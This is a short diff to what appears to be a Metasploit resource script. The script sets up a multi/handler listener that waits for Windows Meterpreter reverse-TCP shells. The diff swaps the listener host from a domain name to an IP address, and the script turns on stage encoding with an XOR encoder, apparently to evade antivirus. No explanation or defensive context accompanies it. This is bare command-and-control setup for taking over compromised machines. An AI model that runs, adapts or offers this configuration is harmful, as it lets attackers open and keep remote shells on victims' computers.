@@ -1,6 +1,6 @@
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST wambiri.ax.lt
+set LHOST 120.145.144.97
 set LPORT 8080
 set EnableStageEncoding true
 set StageEncoder x86/call4_dword_xor
